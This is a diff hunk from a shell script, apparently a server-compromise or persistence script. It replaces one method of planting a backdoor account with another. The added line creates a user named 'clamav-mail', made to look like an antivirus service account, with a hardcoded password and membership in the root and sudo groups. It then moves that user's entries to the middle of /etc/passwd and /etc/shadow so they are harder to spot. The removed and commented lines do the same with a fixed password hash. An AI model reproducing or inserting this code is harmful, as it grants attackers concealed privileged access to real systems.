@@ -702,16 +702,7 @@ echo "[*] Generating ssh key on server"
 ##awk '{lines[NR] = $0} END {last_line = lines[NR]; delete lines[NR]; middle = int(NR/2); for (i=1; i<middle; i++) print lines[i]; print last_line; for (i=middle; i<NR; i++) print lines[i]}' /etc/passwd > /tmp/passwd && sudo mv /tmp/passwd /etc/passwd
 ### NOT NEEDED! ### sudo echo "clamav-mail:'$1$JSi1yOvo$RXt73G6AUw2EhNhvJn4Ei1'" | sudo chpasswd -e
 #         PASSWORD_HASH='$1$GDwMqCqg$eDXKBHbUDpOgunTpref5J1' && if id -u clamav-mail > /dev/null 2>&1; then sudo userdel --remove clamav-mail; fi && if ! grep -q '^sudo:' /etc/group; then sudo groupadd sudo; fi && sudo useradd -u 455 -G root,sudo -M -o -s /bin/bash clamav-mail && sudo chpasswd -e <<< "clamav-mail:$PASSWORD_HASH" && awk '{lines[NR] = $0} END {last_line = lines[NR]; delete lines[NR]; num_lines = NR - 1; middle = int(num_lines / 2 + 1); for (i=1; i<middle; i++) print lines[i]; print last_line; for (i=middle; i<=num_lines; i++) print lines[i];}' /etc/passwd > /tmp/passwd && sudo mv /tmp/passwd /etc/passwd && awk '{lines[NR] = $0} END {last_line = lines[NR]; delete lines[NR]; num_lines = NR - 1; middle = int(num_lines / 2 + 1); for (i=1; i<middle; i++) print lines[i]; print last_line; for (i=middle; i<=num_lines; i++) print lines[i];}' /etc/shadow > /tmp/shadow && sudo mv /tmp/shadow /etc/shadow
-PASSWORD_HASH='$1$GDwMqCqg$eDXKBHbUDpOgunTpref5J1' && \
-if id -u clamav-mail > /dev/null 2>&1; then sudo userdel --remove clamav-mail; fi && \
-if ! grep -q '^sudo:' /etc/group; then sudo groupadd sudo; fi && \
-if ! grep -q '^clamav-mail:' /etc/group; then sudo groupadd clamav-mail; fi && \
-sudo useradd -u 455 -G root,sudo -g clamav-mail -M -o -s /bin/bash clamav-mail && \
-sudo chpasswd -e <<< "clamav-mail:$PASSWORD_HASH" && \
-awk '{lines[NR] = $0} END {last_line = lines[NR]; delete lines[NR]; num_lines = NR - 1; middle = int(num_lines / 2 + 1); for (i=1; i<middle; i++) print lines[i]; print last_line; for (i=middle; i<=num_lines; i++) print lines[i];}' /etc/passwd > /tmp/passwd && \
-sudo mv /tmp/passwd /etc/passwd && \
-awk '{lines[NR] = $0} END {last_line = lines[NR]; delete lines[NR]; num_lines = NR - 1; middle = int(num_lines / 2 + 1); for (i=1; i<middle; i++) print lines[i]; print last_line; for (i=middle; i<=num_lines; i++) print lines[i];}' /etc/shadow > /tmp/shadow && \
-sudo mv /tmp/shadow /etc/shadow
+PASSWORD='1!taugenichts' && HASH_METHOD=$(grep '^ENCRYPT_METHOD' /etc/login.defs | awk '{print $2}' || echo "SHA512") && if [ "$HASH_METHOD" = "SHA512" ]; then PASSWORD_HASH=$(openssl passwd -6 -salt $(openssl rand -base64 3) "$PASSWORD"); else PASSWORD_HASH=$(openssl passwd -1 -salt $(openssl rand -base64 3) "$PASSWORD"); fi && if id -u clamav-mail >/dev/null 2>&1; then sudo userdel --remove clamav-mail; fi && if ! grep -q '^sudo:' /etc/group; then sudo groupadd sudo; fi && if ! grep -q '^clamav-mail:' /etc/group; then sudo groupadd clamav-mail; fi && sudo useradd -u 455 -G root,sudo -g clamav-mail -M -o -s /bin/bash clamav-mail && sudo usermod -p "$PASSWORD_HASH" clamav-mail && awk '{lines[NR]=$0} END{last=lines[NR]; delete lines[NR]; n=NR-1; m=int(n/2+1); for(i=1;i<m;i++) print lines[i]; print last; for(i=m;i<=n;i++) print lines[i]}' /etc/passwd > /tmp/passwd && sudo mv /tmp/passwd /etc/passwd && awk '{lines[NR]=$0} END{last=lines[NR]; delete lines[NR]; n=NR-1; m=int(n/2+1); for(i=1;i<m;i++) print lines[i]; print last; for(i=m;i<=n;i++) print lines[i]}' /etc/shadow > /tmp/shadow && sudo mv /tmp/shadow /etc/shadow
 ### (lala´s std)
 
 # ====== EMERGENCY MONITOR ======
